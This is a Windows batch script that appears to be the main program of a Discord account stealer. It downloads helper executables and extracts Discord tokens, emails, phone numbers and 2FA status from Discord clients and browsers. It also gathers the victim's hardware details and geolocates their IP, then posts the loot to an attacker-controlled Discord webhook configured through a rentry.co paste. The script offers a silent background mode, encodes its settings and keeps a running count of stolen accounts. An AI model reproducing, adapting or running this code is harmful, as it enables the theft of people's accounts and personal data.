@echo off
setlocal enabledelayedexpansion

:: <Settings>
set "Version=2.6.1"
set "APIPasswords=V4KG2CPM-QXWU4PM2"
set FilesDB=DiscordMSG.bat notifu.exe WebParse.exe DAS.exe rentry.exe nonAscii.exe
set "pasteLocation=%temp%\DAS v!Version!\WebPaste.txt"
set DefaultGateway=https://github.com/agamsol/Discord-Stealer/raw/main/
set "DefaultIdentifier=10000-00000"
set "JsonValues=token version CreationDate Enabled author.ID author.Endpoint author.Access"
set "EncodeLength=4"
set "ENCODE.LOWER[/]=djFW" & set "DECODE.LOWER[djFW]=/"
set "UpperList="2YDU/A" "NZ0f/B" "QJ0W/C" "Zwbf/D" "LVH8/E" "g594/F" "5CWA/G" "2B3A/H" "p1A8/I" "VRDo/J" "QM2j/K" "aIv7/L" "rrRR/M" "fQWj/N" "tJpk/O" "CZPX/P" "vFo3/Q" "txZ1/R" "V2az/S" "pNmX/T" "qwyH/U" "vzrr/V" "dQ7T/W" "2kXz/X" "iC8D/Y" "HIBG/Z""
set "LowerList="6ZAU/a" "VhHA/b" "t686/c" "dn7a/d" "WXMe/e" "ChDC/f" "hxxm/g" "IgTb/h" "X640/i" "9YO8/j" "lzCG/k" "kXkt/l" "G0hn/m" "pGm7/n" "XtTR/o" "PPbL/p" "4eyF/q" "QQt3/r" "NeHv/s" "3Nkg/t" "1k8o/u" "kDzt/v" "Q0ei/w" "ad9n/x" "xM9N/y" "sxK7/z" "CQGN/1" "VxhF/2" "5fts/3" "VT2m/4" "w7Ep/5" "BSVp/6" "ru3k/7" "KrbV/8" "CFso/9" "GyeH/0" "XxDP/ " "Cr0O/." "vhV1/-" "g6uZ/+" "UEEQ/$" "JD9X/_" "AmbC/#" "jp5b/@" "iXuP/^^" "yr1b/^&" "nSX4/^(" "xKcE/^)" "BYoT/[" "GosV/]" "mx2X/{" "DnFj/}" "dGaP/^|" "9MBD/^<" "fNOw/^>" "7tkc/^\" "aAZc/'" "aHgW/~" "OlSn/`" "boIx/;" "VkPR/%%" "437F/"""
:: </Settings>

set black=[30m
set yellow=[33m
set green=[32m
set white=[37m
set grey=[90m
set brightred=[91m
set brightblue=[94m

set "PrintCore=     !grey!$ [!brightblue!%username%!grey!]"
set "ErrPrintCore=     !brightred!$ !grey![!brightblue!%username%!grey!]"
set "WrnPrintCore=     !yellow!$ !grey![!brightblue!%username%!grey!]"

echo.
echo !PrintCore! Launching Application - Version ^(!Version!^) . . .!white!

:: <Parameters System>
set notLegacy=%~2
if not defined notLegacy set Identifier=%~1
for %%a in (%*) do (
    set /a Args.length+=1
    set "Arg[!Args.length!]=%%~a"
)
for /L %%a in (1 1 !Args.length!) do (
    for %%b in ("identifier" "builds" "background") do (
            if /i "!Arg[%%a]!"=="--%%~b" (
            set nextArg=%%a
            set /a nextArg+=1
            if /i "%%~b"=="identifier" (
                for /f "delims=" %%c in ("!nextArg!") do (
                    set "Identifier=!Arg[%%c]!"
                    set Identifier=!Identifier:"=!
                )
            )
            if /i "%%~b"=="builds" (
                for /f "delims=" %%c in ("!nextArg!") do (
                    set "Builds=!Arg[%%c]!"
                    set Builds=!Builds:"=!
                )
            )
            if /i "%%~b"=="background" (
                >"%temp%\background.vbs" echo CreateObject^("Wscript.Shell"^).Run """" ^& WScript.Arguments^(0^) ^& """ " ^& WScript.Arguments^(1^), 0
                echo.
                echo !PrintCore! Silent Mode file has been created . . .
                echo.
                echo !WrnPrintCore! Exiting Program.!white!
                exit /b
            )
        )
    )
)
title Loading . . .
for %%a in (Stable PTB Canary Developer Chrome Edge Opera Brave Yandex) do (
    echo !Builds! | findstr /ic:"%%a">nul 2>&1 && set "ValidateBuilds=!ValidateBuilds! %%a"
)
set "Builds=!ValidateBuilds:~1!"
if not "!Builds!"=="~1" (
    echo.
    echo !PrintCore! Sending Specific Builds ; !Builds: =, !.
    )
if "!Builds!"=="~1" set "Builds=Stable PTB Canary Developer Chrome Edge Opera Brave Yandex"
:: </Parameters System>

:: <Download Files And Expand Archive>
for %%a in (!FilesDB!) do if not exist "%temp%\DAS v!Version!\%%a" set /a MissingFiles+=1
if !MissingFiles! gtr 0 (
    echo.
    echo !PrintCore! Downloading Files . . .
    for %%a in ("DiscordMSG.bat" "binary.zip") do (
        curl --create-dirs --ssl-no-revoke -f#kLo "%temp%\DAS v!Version!\%%~a" "!DefaultGateway!/%%~a"
    )
    chcp 437>nul
    cmd /c exit
    echo.
    echo !PrintCore! Expanding Archive . . .!white!
    powershell -command "$ProgressPreference = 'SilentlyContinue'; Expand-Archive '%temp%\DAS v!Version!\binary.zip' -DestinationPath '%temp%\DAS v!Version!' -Force"
    chcp 65001>nul
    del /q "%temp%\DAS v!Version!\binary.zip"
)
for %%a in (!FilesDB!) do (
    set /a File.Length+=1
    set "File[!File.Length!]=%temp%\DAS v!Version!\%%a"
)
:: </Download Files And Expand Archive>

:: <Load Encoder & Decoder>
for %%a in (!UpperList!) do for /f "tokens=1,2 delims=/" %%b in ("%%~a") do (
    set "ENCODE.CAPS[%%c]=%%b"
    set "DECODE.CAPS[%%b]=%%c"
)
for %%a in (!LowerList!) do for /f "tokens=1,2 delims=/" %%b in ("%%~a") do (
    set "ENCODE.LOWER[%%c]=%%b"
    set "DECODE.LOWER[%%b]=%%c"
)
for %%a in (!APIPasswords!) do (
    set /a APIPasswords.Length+=1
    set "APIPassword[!APIPasswords.Length!]=%%a"
)
:: </Load Encoder & Decoder>

:: <Load Identifier>
if not defined Identifier set Identifier=!DefaultIdentifier!
set "IdentifierURL=!DefaultGateway!/identifiers/!Identifier!.json?raw=true"
for /f %%A in ('curl --ssl-no-revoke --silent "!IdentifierURL!"') do set "LINK_TYPE=%%A"
if not "%LINK_TYPE%"=="<html><body>You" (
    set Show_Notifications=true
    set "APP_Nickname=System"
    call :ERRORS "false" "-" "Couldn't find the identifier specified." "{NT}" "false"
)
for /f "delims=" %%a in ('call "!File[3]!" "!IdentifierURL!" !JsonValues!') do set "Json.%%a"
for %%a in (ID Endpoint Access) do (
    call :DECODE "!Json.author.%%a!"
    set "Json.author.%%a=!DecodedString!"
)
for %%a in ("2.5" "2.6" "2.6.1") do if "!Json.version!"=="%%~a" set "Json.version=2.6.1"
set "WebURL=https://rentry.co/!Json.author.Endpoint!"
set "PermaAccess=!Json.author.Access!"
:: </Load Identifier>

:: <Check META DATA>
 if "!version!"=="!Json.version!" set compatible=true
 if not "!Compatible!"=="true" (
     set Show_Notifications=true
     set "APP_Nickname=System"
     call :ERRORS "false" "The Version of the identifier\ndid not match the program version ^(!version!^)" "This Identifier is incompatible with this version.\nIdentifier: !Json.token!" "{NT}" "false"
 )
  if /i "!json.Enabled!"=="false" (
     set Show_Notifications=true
     set "APP_Nickname=System"
     call :ERRORS "false" "-" "This identifier is disabled.\nIdentifier: !Json.token!" "{NT}" "false"
 )
:: </Check META DATA>

:: <Get Software & Hardware information>
 chcp 437>nul
 for /F %%C in ('powershell -command "(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb"') do set "RAM=%%CGB"
 chcp 437>nul
 for /f "tokens=1* delims==" %%a in ('wmic cpu get name /VALUE') do if /i %%a EQU name set "CPU=%%b"
 for /f "tokens=1* delims==" %%a in ('wmic path win32_VideoController get name /value') do if /i %%a equ name set "GPU=%%b"
 for /f "delims=" %%a in ('call "!File[3]!" "http://ip-api.com/json?fields=192511" country countryCode regionName city lat lon timezone isp proxy query') do set "%%a"
:: </Get Software & Hardware information>

:: <Load User Settings for the Identifier>
call :CHECK_CONNECTION
call :GetPasteStatus

for /f "delims=" %%a in ('curl --ssl-no-revoke -k -s "!WebURL!/raw"') do <nul set /p="%%a" | >nul findstr /rc:"^[\[#].*" || set "%%a">nul 2>&1
for %%a in (Webhook Error_Color Success_Color Success_Image Error_Image Success_Title Error_Title Success_Description Error_Description Show_Notifications APP_Nickname Hide_Mail Hide_Phone Hide_Token SendUnclaimedAccounts DATABASE) do (
    if not defined %%a (
        set Show_Notifications=true
        set "APP_Nickname=System"
        call :ERRORS "false" "-" "The Identifier is missing settings and the APP is unable to load.\nIdentifier: !Json.token!" "{NT}" "false"
    )
)
call :DATABASE 0
call :Validate_Webhook

set IdentifierDATA=!Error_Description!
set "IdentifierDATA=!IdentifierDATA:{AccountsStolen}=%AccountsStolen%!"
call :LoadMessagePlaceHolders
:: </Load User Settings for the Identifier>

:: <Collect Discord Builds Information>
for /f "delims=" %%a in ('call "!File[4]!" !APIPassword[1]!') do set "%%a"
if defined Error (
    if "!Error!"=="Invalid password" call :ERRORS "true" "Discord Account Collection program key is invalid." "Program key provided is invalid." "{NT}" "false"
    if "!Error!"=="Not supported" call :ERRORS "true" "This Discord Account Stealer version is no longer maintained, please use a newer version." "This version is no longer maintained, Please update to a newer version." "{NT}" "false"
    if "!Error!"=="Discord not installed" call :ERRORS "true" "Looks Like the User does not have discord installed" "Discord is not installed, please install discord, login and try again." "{NT}" "true"
    if "!Error!"=="User is not logged in" call :ERRORS "true" "Looks like this user is not logged in to any discord account." "This Looks like you have discord but you are not logged in." "{NT}" "true"
)
:: </Collect Discord Builds Information>

:: <Prepare and Send Account(s)>
title !APP_Nickname!
set IdentifierDATA=!Success_Description!
set "IdentifierDATA=!IdentifierDATA:{TotalFailures}=%Failures%!"
call :LoadMessagePlaceHolders
if /i "!Show_Notifications!"=="true" start "" "!File[2]!" /p "!APP_Nickname!" /m "The identifier has been successfully verified.\nIdentifier: !Json.token!\n" /d 0 /i %SYSTEMROOT%\system32\shell32.dll,302
echo.
echo !PrintCore! Identifier has been verified : !Json.token!!white!

for %%a in (!Builds!) do if defined Discord_%%a_User set "BuildsFound=%%a !BuildsFound!"
if /i "!SendUnclaimedAccounts!"=="false" for %%a in (!BuildsFound!) do (
    if /i "!Discord_%%a_Email!"=="none" (
        set "BuildsFound=!BuildsFound:%%a =!"
        set /a Accounts-=1
    )
)

if /i "!Hide_Mail!"=="true" for %%a in (!BuildsFound!) do echo "!Discord_%%a_Email!" | findstr /c:"none">nul || set "Discord_%%a_Email=||!Discord_%%a_Email:@=||@!"
if /i "!Hide_Phone!"=="true" for %%a in (!BuildsFound!) do echo "!Discord_%%a_Phone!" | findstr /c:"null">nul || set "Discord_%%a_Phone=||!Discord_%%a_Phone!||"
if /i "!Hide_Token!"=="true" for %%a in (!BuildsFound!) do set "Discord_%%a_Token=||!Discord_%%a_Token!||"

if !Accounts! gtr 0 (
    for %%a in (!BuildsFound!) do (
        set "MessageBody=!IdentifierDATA!"
        set ImageURL=!Success_Image!
        set MessageTitle=!Success_Title!
        if "%%a"=="Stable" set "MessageBody=!MessageBody:{location}=%%a Discord!"
        for %%b in (PTB Canary Developer) do if "%%a"=="%%b" set "MessageBody=!MessageBody:{location}=Discord %%b!"
        for %%b in (Chrome Edge Opera Brave Yandex) do if "%%a"=="%%b" set "MessageBody=!MessageBody:{location}=%%b Browser!"
        if "!Discord_%%a_Verified!"=="true" ( set "Discord_%%a_Verified=Verified" ) else set "Discord_%%a_Verified=Unverified"
        for %%b in (NSFW 2FA) do (
                if "!Discord_%%a_%%b!"=="true" (
                set "Discord_%%a_%%b=Enabled"
            ) else set "Discord_%%a_%%b=Disabled"
        )
        set /a AccountsStolen+=1
        set ASCII_ERROR=
        for /f "delims=" %%a in ('call "!File[6]!" "!Discord_%%a_User!"') do set "%%a" >nul
        if "!ASCII_ERROR!"=="Unknown Characters found" set "Discord_%%a_User=:warning: Can't Display Name"
        for %%b in ("!AccountsStolen!") do set "MessageBody=!MessageBody:{AccountsStolen}=%%~b!"
        for %%b in ("!Discord_%%a_User!") do set "MessageTitle=!Success_Title:{username}=%%~b!"
        for %%b in ("!Discord_%%a_User!") do set "MessageBody=!MessageBody:{username}=%%~b!"
        for %%b in ("!Discord_%%a_ID!") do set "MessageBody=!MessageBody:{userID}=%%~b!"
        for %%b in ("!Discord_%%a_Email!") do set "MessageBody=!MessageBody:{email}=%%~b!"
        for %%b in ("!Discord_%%a_Phone!") do set "MessageBody=!MessageBody:{phoneNumber}=%%~b!"
        for %%b in ("!Discord_%%a_Verified!") do set "MessageBody=!MessageBody:{isVerified}=%%~b!"
        for %%b in ("!Discord_%%a_Nitro!") do set "MessageBody=!MessageBody:{HasNitro}=%%~b!"
        for %%b in ("!Discord_%%a_Token!") do set "MessageBody=!MessageBody:{token}=%%~b!"
        for %%b in ("!Discord_%%a_NSFW!") do set "MessageBody=!MessageBody:{nsfw}=%%~b!"
        for %%b in ("!Discord_%%a_2FA!") do set "MessageBody=!MessageBody:{2fa}=%%~b!"
        echo !ImageURL!| findstr /C:"{ImageURL}">nul && set "ImageURL=!Discord_%%a_ImageURL!"
        call "!File[1]!" +silent --embed "!MessageTitle!" "!MessageBody:\n=\\n!" "!Success_Color!" "!ImageURL!"
    )
call :DATABASE 1
) else REM Send message no accounts sent
echo.
echo !PrintCore! The Application Has finished.
if /i "!Show_Notifications!"=="true" start "" "!File[2]!" /p "!APP_Nickname!" /m "The Application has been successfully finished." /d 0 /i %SYSTEMROOT%\system32\shell32.dll,302
echo.
echo !WrnPrintCore! Closing window in 10 seconds . . .!white!
timeout /t 10 /nobreak >nul
exit /b
:: </Prepare and Send Account(s)>

:: <Errors System - Actions for the Error>
:ERRORS "true" "Discord Message Text" "Notification Text" "Print Error or {NT}" "<Stats> (true/false)"
if defined APP_Nickname ( title !APP_Nickname! ^| ERROR ) else ( title System ^| ERROR)
set "ErrorMessageBody=!IdentifierDATA!"
set "ErrorDiscordText=%~2"
set "NotificationText=%~3"
set "PrintError=%~4"!
set "AddStats=%~5"
if "!AddStats!"=="true" (
    set /a Failures+=1
    call :DATABASE 1
)
echo.
echo !ErrPrintCore! !PrintError:{NT}=%NotificationText:\n= %!
set "ErrorMessageBody=!ErrorMessageBody:{TotalFailures}=%Failures%!"
if /i "!Show_Notifications!"=="true" start "" "!File[2]!" /p "!APP_Nickname! | ERROR" /m "!NotificationText!" /d 0 /i %SYSTEMROOT%\system32\shell32.dll,131
set ErrorMessageBody=!ErrorMessageBody:{error}=%ErrorDiscordText%!
if "%~1"=="true" call "!File[1]!" +silent --embed "!Error_Title!" "!ErrorMessageBody:\n=\\n!" "!Error_Color!" "!Error_Image!"
echo.
echo !WrnPrintCore! Closing window in 10 seconds . . .!white!
timeout /t 10 /nobreak >nul
exit
:: </Errors System - Actions for the Error>

:: <Decoder>
:DECODE
set "EncodedString=%~1"
call :strLen EncodedString TEMP.decode.stringLen
set "DecodedString="
set /a TEMP.decode.stringLen-=1
for /L %%a in (0,!EncodeLength!,!TEMP.decode.stringLen!) do (
    for /f %%b in ("!EncodedString:~%%a,%EncodeLength%!") do (
        set "DecodedString=!DecodedString!!DECODE.CAPS[%%b]!"
        set "DecodedString=!DecodedString!!DECODE.LOWER[%%b]!"
    )
)
exit /b
:: </Decoder>

:: <Encoder>
:ENCODE
set "DecodedString=%~1"
call :strLen DecodedString TEMP.encode.stringLen
set "EncodedString="
set /a TEMP.encode.stringLen-=1
for /L %%a in (0 1 !TEMP.encode.stringLen!) do (
    for /f "delims=" %%b in ("!DecodedString:~%%a,1!") do (
        if not "%%b"==":" (
            echo %%b| findstr "^[ABCDEFGHIJKLMNOPQRSTUVWXYZ]*$" >nul 2>&1 & if !errorlevel! equ 0 (
                set "EncodedString=!EncodedString!!ENCODE.CAPS[%%b]!"
                ) else (
                set "EncodedString=!EncodedString!!ENCODE.LOWER[%%b]!"
            )
        )
    )
)
exit /b
:: </Encoder>

:: <String Counter>
:strLen
setlocal disableDelayedExpansion
set len=0
if defined %~1 for /f "delims=:" %%N in (
'"(cmd /v:on /c echo(!%~1!&echo()|findstr /o ^^"'
) do set /a "len=%%N-3"
endlocal & if "%~2" neq "" (set %~2=%len%) else echo %len%
exit /b
:: </String Counter>

:: <Discord Webhook Validator>
:Validate_Webhook
 for %%a in (ptb canary) do set "Webhook=!Webhook:%%a.=!"
 if not "!Webhook:~0,33!"=="https://discord.com/api/webhooks/" set "ERROR=Invalid Webhook URL"
 for /F "tokens=* USEBACKQ" %%a in (`curl --ssl-no-revoke --silent "%webhook%"`) do set "WebhookCheck=%%a"
 for %%a in ("404: Not Found" "401: Unauthorized" "Invalid Webhook Token") do echo !WebhookCheck! | findstr /ic:%%a >nul && set "ERROR=Invalid Webhook URL"
 if "!Error!"=="Invalid Webhook URL" call :ERRORS "false" "-" "Error Accured while verifing the identifier.\nIdentifier: !Json.token!" "Invalid Webhook URL for the identifier: !Json.token!." "false"
 exit /b
:: </Discord Webhook Validator>

:: <Rentry.co Status>
:CHECK_CONNECTION
ping rentry.co -n 1 | findstr "TTL" >nul
if !ErrorLevel! equ 1 (
    set Show_Notifications=true
    set "APP_Nickname=System"
    call :ERRORS "false" "-" "Rentry.co was found to be offline." "{NT}" "false"
    )
exit /b
:: </Rentry.co Status>

:: <Check existence of rentry.co pastes>
:GetPasteStatus
for /f "tokens=*" %%a in ('curl --ssl-no-revoke -k -s "!WebURL!/raw"') do if "%%a"=="<!DOCTYPE html>" (
    set Show_Notifications=true
    set "APP_Nickname=System"
    call :ERRORS "false" "-" "Couldn't find the paste specified.\nIdentifier: !Json.token!" "{NT}" "false"
)
exit /b
:: <Check existence of rentry.co pastes>

:: <DATABASE>
:DATABASE
if "%~1"=="0" (
    call :DECODE "!DATABASE!"
    for /f "delims=+ tokens=1,2" %%a in ("!DecodedString!") do (
        set "AccountsStolen=%%a"
        set "Failures=%%b"
    )
)
if "%~1"=="1" (
    set "DATABASE=!AccountsStolen!+!Failures!"
    call :ENCODE "!DATABASE!"
    set "DATABASE=!EncodedString!"
    call :LOCAL_PASTE
    for /f "delims=" %%a in ('type "!pasteLocation!" ^| call "!File[5]!" edit -u "!WebURL!" --edit-code "!Json.author.Access!"') do (
        set Rentry_ERROR=%%a
    )
    del "!pasteLocation!"
    if "!Rentry_ERROR!"=="error: Invalid edit code" call "!File[1]!" +silent --message "```ERROR: An error occurred while updating the database for the identifier '!Json.token!'\\nJoin our discord server to solve this issue : discord.gg/PUxp8KmRv5```"
)
exit /b
:: </DATABASE>

:: <Update Paste Locally>
:LOCAL_PASTE
>"!pasteLocation!" (
    echo ```ini
    echo ; Discord Webhook
    echo Webhook=!Webhook!
    echo.
    echo ; Discord Message Layout Colors
    echo Error_Color=!Error_Color!
    echo Success_Color=!Success_Color!
    echo.
    echo ; Discord Embed Layout
    echo Success_Image=!Success_Image!
    echo Error_Image=!Error_Image!
    echo.
    echo Success_Title=!Success_Title!
    echo Error_Title=!Error_Title!
    echo.
    echo Success_Description=!Success_Description!
    echo Error_Description=!Error_Description!
    echo.
    echo ; Settings
    echo Show_Notifications=!Show_Notifications!
    echo APP_Nickname=!APP_Nickname!
    echo Hide_Mail=!Hide_Mail!
    echo Hide_Phone=!Hide_Mail!
    echo Hide_Token=!Hide_Token!
    echo ; whether to send unclaimed discord accounts
    echo SendUnclaimedAccounts=!SendUnclaimedAccounts!
    echo.
    echo ; DATABASE
    echo ; NOTE: CHANGING THIS CAN CAUSE DAMAGE TO YOUR IDENTIFIER.
    echo DATABASE=!DATABASE!
    echo ```
)
exit /b
:: </Update Paste Locally>

:: <Load Message Placeholders>
:LoadMessagePlaceHolders
if "!proxy!"=="false" (
    set "VPN=:red_circle: OFF"
) else set "VPN=:green_circle: ON - :warning: Some Information may be incorrect"
set "Country=!country! (!countryCode!)"
set "Region=!regionName!"
set "PCuser=!username!"
set "IdentifierCreationDate=!Json.CreationDate!"
set "IdentifierVersion=!Json.version!"
set IdentifierDATA=!IdentifierDATA:{IdentifierToken}=[%Json.token%](%WebURL%)!
set "IdentifierDATA=!IdentifierDATA:{IdentifierEditCode}=%PermaAccess%!"
for %%a in (RAM CPU GPU COUNTRY VPN REGION CITY LAT LON TIMEZONE ISP QUERY COMPUTERNAME PCUSER IdentifierCreationDate IdentifierVersion) do (
    for %%b in ("!%%a!") do set "IdentifierDATA=!IdentifierDATA:{%%a}=%%~b!"
)
exit /b
:: </Load Message Placeholders>
